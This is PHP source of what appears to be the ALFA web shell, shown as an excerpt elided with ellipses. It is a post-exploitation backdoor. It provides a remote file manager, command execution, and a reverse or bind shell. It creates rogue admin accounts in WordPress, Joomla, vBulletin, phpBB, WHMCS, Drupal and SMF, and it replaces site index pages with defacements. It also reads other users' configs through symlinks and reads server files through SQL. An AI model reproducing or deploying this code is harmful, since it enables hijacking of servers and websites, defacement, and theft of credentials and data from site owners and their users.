                        $getToken = preg_match('/name="token" value="(.*?)"/i', $saveurl, $token);
                        $AlfaSole->Send($path . '/pwreset.php', 'post', "token={$token[1]}&action=reset&email=solevisiblefbi.gov");
    ...
    if (isset($_POST['alfa2']) && 'mybb' == $_POST['alfa2']) {
...
";
        $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'],   'td2' => ['color' => 'FFFFFF', 'tdName' => 'DataBase Name : ', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'],   'td3' => ['color' => 'FFFFFF', 'tdName' => 'User Name : ', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'],   'td4' => ['color' => 'FFFFFF', 'tdName' => 'Password : ', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'],   'td5' => ['color' => 'FFFFFF', 'tdName' => 'Table Prefix : ', 'inputName' => 'prefix', 'id' => 'db_prefix', 'inputValue' => 'mybb_', 'inputSize' => '50']];
        create_table($table);
        echo $selector;
        ...
        if (isset($_POST['alfa6'])) {
            ...
            if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($newinshell)) {
                ...
                if (extension_loaded('sockets') && function_exists('fsockopen') && 'auto' == $method) {
                ...
                } elseif (function_exists('curl_version') && 'auto' == $method) {
    ...
    if (isset($_POST['alfa3']) && 'vb' == $_POST['alfa3']) {
        ...
        $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'lo', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'],   'td2' => ['color' => 'FFFFFF', 'tdName' => 'DataBase Name : ', 'inputName' => 'db', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'],   'td3' => ['color' => 'FFFFFF', 'tdName' => 'User Name : ', 'inputName' => 'user', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'],   'td4' => ['color' => 'FFFFFF', 'tdName' => 'Password : ', 'inputName' => 'pass', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'],   'td5' => ['color' => 'FFFFFF', 'tdName' => 'Table Prefix : ', 'inputName' => 'tab', 'id' => 'db_prefix', 'inputValue' => '', 'inputSize' => '50']];
        create_table($table);
        echo $selector;
...
if (!function_exists('posix_getpwuid') && (false === strpos(ini_get('disable_functions'), 'posix_getpwuid'))) {
...
if (!function_exists('posix_getgrgid') && (false === strpos(ini_get('disable_functions'), 'posix_getgrgid'))) {
...
function alfaPerms($p)
{
    if (0xC000 == ($p & 0xC000)) {
        $i = 's';
    } elseif (0xA000 == ($p & 0xA000)) {
        $i = 'l';
    } elseif (0x8000 == ($p & 0x8000)) {
        $i = '-';
    } elseif (0x6000 == ($p & 0x6000)) {
        $i = 'b';
    } elseif (0x4000 == ($p & 0x4000)) {
        $i = 'd';
    } elseif (0x2000 == ($p & 0x2000)) {
        $i = 'c';
    } elseif (0x1000 == ($p & 0x1000)) {
        $i = 'p';
    } else {
        $i = 'u';
    }
...
function alfaFilesMan()
{
    ...
    if (!empty($_POST['alfa1'])) {
        switch ($_POST['alfa1']) {  case 'uploadFile':  if (isset($GLOBALS['glob_chdir_false'])) {
            $alfa_canruncmd = _alfa_can_runCommand(true, true);
            $move_cmd_file = true;
        }  $files = reArrayFiles($_FILES['f']); foreach ($files as $file) {
            if ($move_cmd_file) {
            ...
            echo 'uped...!<Br>';
        }  break; case 'mkdir':  $new_dir_cmd = false; if (isset($GLOBALS['glob_chdir_false'])) {
        ...
        }  break; case 'delete':  function deleteDir($path)
        {
        ...
        }  break; case 'paste':  if ('copy' == $_SESSION['act'] && isset($_SESSION['f'])) {
        ...
        } elseif ('move' == $_SESSION['act'] && isset($_SESSION['f'])) {
        ...
        } elseif ('zip' == $_SESSION['act'] && isset($_SESSION['f'])) {
        ...
        } elseif ('unzip' == $_SESSION['act'] && isset($_SESSION['f'])) {
            if (class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                foreach ($_SESSION['f'] as $f) {
        ...
        }  unset($_SESSION['f']); break; default:  if (!empty($_POST['alfa1'])) {
    ...
    if (isset($_SESSION[__LAST_CWD__]) && !isset($_POST['c']) && '' != $_SESSION[__LAST_CWD__]) {
        ...
        $_SESSION[__LAST_CWD__] = str_replace(['..', '//'], ['', '/'], $_POST['c']);
    }
    $cmd_dir = false;
    if (false === $dirContent) {
        if (_alfa_can_runCommand(true, true)) {
    ...
    for ($i = 0; $i < $n; ++$i) {
        ...
        $tmp = ['name' => $filename,  'path' => $file_path,  'modify' => $file_modify,  'perms' => $file_perm,  'size' => $file_size,  'owner' => $file_owner,  'group' => $file_group];
        if (!$cmd_dir) {
...
function alfaFilesTools()
{
    ...
    if ('rename' == $_POST['alfa2'] && !empty($_POST['alfa3']) && is_writable($_POST['alfa1'])) {
        $rename_cache = $_POST['alfa3'];
    }
    if ('mkfile' == $_POST['alfa2']) {
    ...
    if (!_alfa_is_dir($_POST['alfa1'])) {
        $m = ['View', 'Edit', 'Download', 'Highlight', 'Chmod', 'Rename', 'Touch', 'Delete', 'Image', 'Hexdump'];
        $ftype = 'file';
    } else {
    ...
    foreach ($m as $v) {
        echo 'Delete' == $v ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\'' . addslashes(!isset($rename_cache) ? $_POST['alfa1'] : $rename_cache) . '\',\'' . strtolower($v) . '\',\'\',\'' . $_POST['c'] . '\',\'' . $_POST['alfa4'] . '\',\'' . $ftype . '\'):\'\';"><span class="editor_actions">' . ((strtolower($v) == $_POST['alfa2']) ? '<b><span class="editor_actions"> ' . $v . ' </span> </b>' : $v) . ' | </span></a> ' : '<a href="javascript:void(0);" onclick="editor(\'' . addslashes(!isset($rename_cache) ? $_POST['alfa1'] : $rename_cache) . '\',\'' . strtolower($v) . '\',\'\',\'' . $_POST['c'] . '\',\'' . $_POST['alfa4'] . '\',\'' . $ftype . '\')"><span class="editor_actions">' . ((strtolower($v) == $_POST['alfa2']) ? '<b><span class="editor_actions"> ' . $v . ' </span> </b>' : $v) . ' | </span></a>';
    }
    echo '<br><br>';
    switch ($_POST['alfa2']) {  case 'view':  chdir($_POST['c']); echo '<div class="editor-view"><div class="view-content"><p><button style="border-radius:10px;" class="button" onClick="copyToClipboard(\'view_ml_content\');">copy to clipboard</button></p><pre class="ml1" id="view_ml_content">'; echo htmlspecialchars(__read_file($_POST['alfa1'])); echo '</pre></div></div>'; break; case 'highlight':  chdir($_POST['c']); if (is_readable($_POST['alfa1'])) {
    ...
    }  break; case 'delete':  chdir($_POST['c']); if (is_writable($_POST['alfa1']) || isset($GLOBALS['glob_chdir_false'])) {
        $deleted = true;
    ...
    }  break; case 'chmod':  chdir($_POST['c']); if (!empty($_POST['alfa3'])) {
        $perms = 0;
    ...
    }  clearstatcache(); if ($chdir_fals) {
        $file_perm = $file_info[5];
    } else {
        $file_perm = substr(sprintf('%o', fileperms($_POST['alfa1'])), -4);
    }  echo '<script>alfa3_="";</script><form onsubmit="editor(\'' . addslashes($_POST['alfa1']) . '\',\'' . $_POST['alfa2'] . '\',this.chmod.value,\'' . $_POST['c'] . '\',\'' . $_POST['alfa4'] . '\',\'' . $ftype . '\');return false;"><input type="text" name="chmod" value="' . $file_perm . '"><input type=submit value=" "></form>'; break; case 'edit':  chdir($_POST['c']); if (!is_writable($_POST['alfa1']) && !_alfa_is_writable($_POST['alfa1'])) {
    ...
    }  echo '<button class="button" style="border-radius:10px;" onClick="copyToClipboard(\'edit_textarea_content\');">copy to clipboard</button><form id="editor_edit_area" onsubmit="editor(\'' . addslashes($alfa1_decoded) . '\',\'' . $_POST['alfa2'] . '\',\'1\'+this.text.value,\'' . $_POST['c'] . '\',\'' . $_POST['alfa4'] . '\',\'' . $ftype . '\');return false;"><p><input type="submit" value=" "></p><textarea name="text" id="edit_textarea_content" class="bigarea" onkeydown="saveByKey(event);">'; echo htmlspecialchars(__read_file($_POST['alfa1'])); echo '</textarea><p><input type="submit" value=" "></p></form>'; break; case 'hexdump':  chdir($_POST['c']); $c = __read_file($_POST['alfa1']); $n = 0; $h = ['00000000<br>', '', '']; $len = strlen($c); for ($i = 0; $i < $len; ++$i) {
        $h[1] .= sprintf('%02X', ord($c[$i])) . ' ';
        switch (ord($c[$i])) {  case 0: $h[2] .= ' '; break; case 9: $h[2] .= ' '; break; case 10: $h[2] .= ' '; break; case 13: $h[2] .= ' '; break; default: $h[2] .= $c[$i]; break; }
        ++$n;
        if (32 == $n) {
            $n = 0;
            if ($i + 1 < $len) {
...
{
    alfahead();
    if (isset($_POST['alfa2']) && ('ini' == $_POST['alfa2'])) {
        echo '<div class=header>';
        ob_start();
        $INI = ini_get_all();
        echo '<table border=0><tr>' . '<td class="listing"><font class="highlight_txt">Param</td>' . '<td class="listing"><font class="highlight_txt">Global value</td>' . '<td class="listing"><font class="highlight_txt">Local Value</td>' . '<td class="listing"><font class="highlight_txt">Access</td></tr>';
    ...
    if (isset($_POST['alfa2']) && ('info' == $_POST['alfa2'])) {
    ...
    if (isset($_POST['alfa2']) && ('exten' == $_POST['alfa2'])) {
        echo '<div class=header>';
        ob_start();
    ...
    $lang_html = '';
    foreach (['php' => 'php ~> [ Windows / Linux ]', 'perl' => 'perl ~> [ Linux ]', 'python' => 'python ~> [ Linux ]', 'bash' => 'bash ~> [ Linux ]'] as $key => $val) {
    ...
    if (!empty($_POST['alfa1'])) {
        ...
        } elseif (_alfa_can_runCommand() && 'unix' == $GLOBALS['sys']) {
...
function alfaIndexChanger()
{
    ...
    if (isset($_POST['alfa3']) && ('whmcs' == $_POST['alfa3'])) {
        echo __pre();
...
";
        $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'],   'td2' => ['color' => 'FFFFFF', 'tdName' => 'URL', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'],   'td3' => ['color' => 'FFFFFF', 'tdName' => 'File Name', 'inputName' => 'fname', 'inputValue' => '', 'inputSize' => '50'],   'td4' => ['color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'],   'td5' => ['color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'],   'td6' => ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50']];
        create_table($table);
...
";
        $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'],   'td2' => ['color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'],   'td3' => ['color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'],   'td4' => ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'],   'td5' => ['color' => 'FFFFFF', 'tdName' => 'Prefix', 'inputName' => 'prefix', 'id' => 'db_prefix', 'inputValue' => '', 'inputSize' => '50']];
        create_table($table);
        echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name='index' rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
...
";
        $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'mybbdbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'],   'td2' => ['color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'mybbdbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'],   'td3' => ['color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'mybbdbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'],   'td4' => ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'mybbdbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50']];
        create_table($table);
        echo "<br><div class='txtfont'>| Your Index |</div><br>
...
function alfaproc()
{
    ...
    if ('win' == $GLOBALS['sys']) {
        $process = ['Task List' => 'tasklist /V',  'System Info' => 'systeminfo',  'Active Connections' => 'netstat -an',  'Running Services' => 'net start',  'User Accounts' => 'net user',  'Show Computers' => 'net view',  'ARP Table' => 'arp -a',  'IP Configuration' => 'ipconfig /all'];
    } else {
        $process = ['Process status' => 'ps aux',  'Syslog' => 'cat /etc/syslog.conf',  'Resolv' => 'cat /etc/resolv.conf',  'Hosts' => 'cat /etc/hosts',  'Cpuinfo' => 'cat /proc/cpuinfo',  'Version' => 'cat /proc/version',  'Sbin' => 'ls -al /usr/sbin',  'Interrupts' => 'cat /proc/interrupts',  'lsattr' => 'lsattr -va',  'Uptime' => 'uptime',  'Fstab' => 'cat /etc/fstab'];
    }
...
function alfasafe()
{
    ...
    if (!empty($_POST['alfa8']) && 'domains' == isset($_POST['alfa8'])) {
    ...
    if (!empty($_POST['alfa6']) && 'valiases' == isset($_POST['alfa6'])) {
        echo '
...
<div class=\"txtfont\">Mehtod:</div> <select name='cbmethod' onChange='ctlbc(this);' style='width:120px;'><option value='back'>Reverse Shell</option><option value='bind'>Bind Port</option></select> <div class=\"txtfont\">Use:</div> <select name='selectCb'>";
    ...
    foreach ($cbArr as $key => $val) {
        echo "<option value='{$key}' " . ('win' == $GLOBALS['sys'] ? 'selected' : '') . ">{$val}</option>";
    }
    ...
    if (isset($_POST['alfa1']) && !empty($_POST['alfa1'])) {
        ...
        $ip = $_POST['alfa2'];
        $port = $_POST['alfa3'];
        $arg = ('bind' == $_POST['alfa4'] ? $port : $port . ' ' . $ip);
        $tmpdir = ALFA_TEMPDIR;
        ...
        if (in_array($lang, $allow)) {
            if (__write_file($name, __get_resource($lan))) {
                if (_alfa_can_runCommand(true, true)) {
                    $os = ('win' != $GLOBALS['sys']) ? '1>/dev/null 2>&1 &' : '';
...
<center><h3>';
    ...
    echo '</h3></center>';
    if (isset($_POST['alfa1']) && 'wp' == $_POST['alfa1']) {
...
<p>' . getConfigHtml('wp') . '</p><form onSubmit="g(\'pwchanger\',null,\'wp\',\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">';
        $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id' => 'db_host', 'inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'],   'td2' => ['color' => 'FFFFFF', 'tdName' => 'Db Name', 'id' => 'db_name', 'inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'],   'td3' => ['color' => 'FFFFFF', 'tdName' => 'Db User', 'id' => 'db_user', 'inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'],   'td4' => ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id' => 'db_pw', 'inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'],   'td5' => ['color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id' => 'db_prefix', 'inputName' => 'prefix', 'inputValue' => 'wp_', 'inputSize' => '50'],   'td6' => ['color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'],   'td7' => ['color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true],   'td8' => ['color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisiblefbi.gov', 'inputSize' => '50']];
        create_table($table);
    ...
    if ($_POST['alfa2'] && 'joomla' == $_POST['alfa2']) {
        ...
        $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id' => 'db_host', 'inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'],   'td2' => ['color' => 'FFFFFF', 'tdName' => 'Db Name', 'id' => 'db_name', 'inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'],   'td3' => ['color' => 'FFFFFF', 'tdName' => 'Db User', 'id' => 'db_user', 'inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'],   'td4' => ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id' => 'db_pw', 'inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'],   'td5' => ['color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id' => 'db_prefix', 'inputName' => 'prefix', 'inputValue' => 'jos_', 'inputSize' => '50'],   'td6' => ['color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'],   'td7' => ['color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true],   'td8' => ['color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisiblefbi.gov', 'inputSize' => '50']];
        create_table($table);
    ...
    if ($_POST['alfa4'] && 'vb' == $_POST['alfa4']) {
        ...
        $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id' => 'db_host', 'inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'],   'td2' => ['color' => 'FFFFFF', 'tdName' => 'Db Name', 'id' => 'db_name', 'inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'],   'td3' => ['color' => 'FFFFFF', 'tdName' => 'Db User', 'id' => 'db_user', 'inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'],   'td4' => ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id' => 'db_pw', 'inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'],   'td5' => ['color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id' => 'db_prefix', 'inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'],   'td6' => ['color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'],   'td7' => ['color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true],   'td8' => ['color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisiblefbi.gov', 'inputSize' => '50']];
        create_table($table);
        echo '<p><input value=" " name="send" type="submit"></p></form></center>';
        if ($_POST['alfa1'] && '>>' == $_POST['alfa1']) {
    ...
    if (isset($_POST['alfa5']) && 'phpbb' == $_POST['alfa5']) {
        ...
        $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id' => 'db_host', 'inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'],   'td2' => ['color' => 'FFFFFF', 'tdName' => 'Db Name', 'id' => 'db_name', 'inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'],   'td3' => ['color' => 'FFFFFF', 'tdName' => 'Db User', 'id' => 'db_user', 'inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'],   'td4' => ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id' => 'db_pw', 'inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'],   'td5' => ['color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id' => 'db_prefix', 'inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'],   'td6' => ['color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'],   'td7' => ['color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true],   'td8' => ['color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisiblefbi.gov', 'inputSize' => '50']];
        create_table($table);
        echo '<p><input value=" " name="send" type="submit"></p></form></center>';
        if ($_POST['alfa1'] && '>>' == $_POST['alfa1']) {
            $localhost = $_POST['alfa2'];
    ...
    if (isset($_POST['alfa6']) && 'whmcs' == $_POST['alfa6']) {
        ...
        $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id' => 'db_host', 'inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'],   'td2' => ['color' => 'FFFFFF', 'tdName' => 'Db Name', 'id' => 'db_name', 'inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'],   'td3' => ['color' => 'FFFFFF', 'tdName' => 'Db User', 'id' => 'db_user', 'inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'],   'td4' => ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id' => 'db_pw', 'inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'],   'td6' => ['color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'],   'td7' => ['color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true],   'td8' => ['color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisiblefbi.gov', 'inputSize' => '50']];
        create_table($table);
        echo '<p><input value=" " name="send" type="submit"></p></form></center>';
        if ($_POST['alfa1'] && '>>' == $_POST['alfa1']) {
            $localhost = $_POST['alfa2'];
    ...
    if (isset($_POST['alfa7']) && 'mybb' == $_POST['alfa7']) {
    ...
    if (isset($_POST['alfa8']) && 'nuke' == $_POST['alfa8']) {
    ...
    if (isset($_POST['alfa9']) && 'drupal' == $_POST['alfa9']) {
        ...
        if ($_POST['alfa1'] && '>>' == $_POST['alfa1']) {
            ...
            $solevisible = mysqli_query($conn, "insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','solevisiblefbi.gov','filtered_html','1','Europe/Berlin','solevisiblefbi.gov')") or die(mysqli_error($conn));
    ...
    if (isset($_POST['alfa10']) && 'smf' == $_POST['alfa10']) {
        ...
        $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id' => 'db_host', 'inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'],   'td2' => ['color' => 'FFFFFF', 'tdName' => 'Db Name', 'id' => 'db_name', 'inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'],   'td3' => ['color' => 'FFFFFF', 'tdName' => 'Db User', 'id' => 'db_user', 'inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'],   'td4' => ['color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id' => 'db_pw', 'inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'],   'td5' => ['color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id' => 'db_prefix', 'inputName' => 'prefix', 'inputValue' => 'smf_', 'inputSize' => '50'],   'td6' => ['color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'],   'td7' => ['color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true]];
        create_table($table);
        echo '<p><input value=" " name="send" type="submit"></p></form></center>';
        if ($_POST['alfa1'] && '>>' == $_POST['alfa1']) {
            $localhost = $_POST['alfa2'];
            ...
            $solevisible = mysqli_query($conn, "insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','solevisiblefbi.gov')") or die(mysqli_error($conn));
            if ($solevisible) {
                __alert('Success... ' . $admin . ' is created...');
            }
        }
...
function alfasymlink()
{
    ...
    if (isset($_POST['alfa2']) && ('symperl' == $_POST['alfa2'] || 'sympy' == $_POST['alfa2'])) {
        $sympath = alfaMakePwd();
        mkdir('cgialfa', 0755);
        chdir('cgialfa');
        alfacgihtaccess('cgi');
    ...
    if (isset($_POST['alfa4']) && 'SymFile' == $_POST['alfa4']) {
...
<p><input type="submit" value=" " name="symlink" /></p></form></center>';
    ...
    if (isset($_POST['alfa2']) && 'symphp' == $_POST['alfa2']) {
        $cant_symlink = true;
                ...
                foreach ($lines as $line) {
                    ...
                    if ($anonymous) {
                        ...
                        foreach ($anony_domains as $anony) {
                            ...
                            } elseif ('named' == $state || 'valiases' == $state) {
                                if ('.' == $anony || '..' == $anony) {
                                    continue;
                                }
                                if ('named' == $state) {
                        ...
                        if (strlen(trim($domain)) > 2 && 'passwd' != $state) {
                    ...
                    if (!$anonymous) {
                        if (0 == strlen($owner) || in_array($owner . $domain, $f_black)) {
                            continue;
                        }
                        $sympath = str_replace('{user}', $owner, $makepwd);
                        $http = 'http://' . $domain;
...
function alfasql()
{
    ...
    class DbClass
    {
        ...
        {
            switch ($this->type) {  case 'mysql':  if ($this->link = mysqli_connect($host, $user, $pass, $dbname)) {
                return true;
            }  break; case 'pgsql':  $host = explode(':', $host); if (!$host[1]) {
                $host[1] = 5432;
        ...
        {
            switch ($this->type) {  case 'mysql':  if (mysqli_select_db($db)) {
                return true;
            }  break; }
        ...
        {
            switch ($this->type) {  case 'mysql':  return $this->res = mysqli_query($this->link, $str); break; case 'pgsql':  return $this->res = pg_query($this->link, $str); break; }
        ...
        public function fetch()
        {
            ...
            switch ($this->type) {  case 'mysql':  return mysqli_fetch_assoc($res); break; case 'pgsql':  return pg_fetch_assoc($res); break; }
        ...
        {
            switch ($this->type) {  case 'mysql':  return $this->query('SHOW databases'); break; case 'pgsql':  return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'"); break; }
        ...
        {
            switch ($this->type) {  case 'mysql':  return $this->res = $this->query('SHOW TABLES'); break; case 'pgsql':  return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'"); break; }
        ...
        {
            switch ($this->type) {  case 'mysql':  return mysqli_error($this->link); break; case 'pgsql':  return pg_last_error(); break; }
        ...
        {
            switch ($this->type) {  case 'mysql':  if (function_exists('mysql_set_charset')) {
        ...
        {
            switch ($this->type) {  case 'mysql':  return $this->fetch($this->query("SELECT LOAD_FILE('" . addslashes($str) . "') as file")); break; case 'pgsql':  $this->query("CREATE TABLE solevisible(file text);COPY solevisible FROM '" . addslashes($str) . "';select file from solevisible;"); $r = []; while ($i = $this->fetch()) {
                $r[] = $i['file'];
...
return ['file' => implode("\n", $r)]; break; }
        ...
        public function dump($table, $fp = false)
        {
            switch ($this->type) {  case 'mysql':  $res = $this->query('SHOW CREATE TABLE `' . $table . '`'); $create = mysqli_fetch_array($res); $sql = $create[1] . ";\n"; if ($fp) {
                fwrite($fp, $sql);
            } else {
                echo $sql;
            }  $this->query('SELECT * FROM `' . $table . '`'); $head = true; while ($item = $this->fetch()) {
                $columns = [];
                foreach ($item as $k => $v) {
                    if (null == $v) {
                        $item[$k] = "''";
            ...
            }  break; case 'pgsql':  $this->query('SELECT * FROM ' . $table); while ($item = $this->fetch()) {
                $columns = [];
                foreach ($item as $k => $v) {
                    $item[$k] = "'" . addslashes($v) . "'";
                    $columns[] = $k;
    ...
    if ('dumpfile' == $_POST['alfa1'] || 'droptbl' == $_POST['alfa1']) {
        $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
        $db->selectdb($_POST['sql_base']);
        switch ($_POST['charset']) {  case 'Windows-1251': $db->setCharset('calfa1251'); break; case 'UTF-8': $db->setCharset('utf8'); break; case 'KOI8-R': $db->setCharset('koi8r'); break; case 'KOI8-U': $db->setCharset('koi8u'); break; case 'calfa866': $db->setCharset('calfa866'); break; }
        $json = json_decode($_POST['alfa2'], true);
        if (count($json['tbl']) > 0) {
            if ('dumpfile' == $_POST['alfa1']) {
...
";
    if (isset($db) && $db->link) {
        ...
        if (!empty($_POST['sql_base'])) {
            ...
            if (('query' == $_POST['alfa1']) && !empty($_POST['alfa2'])) {
            ...
            echo '</form>';
            if (('edit' == $_POST['alfa1']) && !empty($_POST['alfa2'])) {
                ...
                foreach ($fetch as $key => $value) {
                    if ('__ALFAKEY' == $key || '__ALFAKEYVAL' == $key) {
                        continue;
                    }
                    $value = htmlspecialchars($value);
                    echo "<tr><td>$key</td><td><input name='$key' value='$value' /></td></tr>";
                }
                echo "</table><input type='hidden' name='__ALFADATA' value='" . __ZW5jb2Rlcg(json_encode(('0' != $data[1] ? ['__ALFAKEY' => $data[1], '__ALFAKEYVAL' => $data[2]] : $fetch))) . "'><input type='hidden' name='__ALFATBL' value='{$data[0]}'><input type='submit' value=' '></form>";
            }
            if (('update' == $_POST['alfa1']) && !empty($_POST['alfa2'])) {
                ...
                foreach ($data as $key => $value) {
                    if ('__ALFATBL' == $key || '__ALFADATA' == $key) {
                        continue;
                    }
                ...
                echo "</table><input type='hidden' name='__ALFADATA' value='" . __ZW5jb2Rlcg(json_encode((isset($data2['__ALFAKEY']) ? ['__ALFAKEY' => $keyval['__ALFAKEY'], '__ALFAKEYVAL' => $keyval['__ALFAKEYVAL']] : $data))) . "'><input type='hidden' name='__ALFATBL' value='{$data['__ALFATBL']}'><input type='submit' value=' '></form>";
            ...
            if ('edit' != $_POST['alfa1'] && 'update' != $_POST['alfa1']) {
...
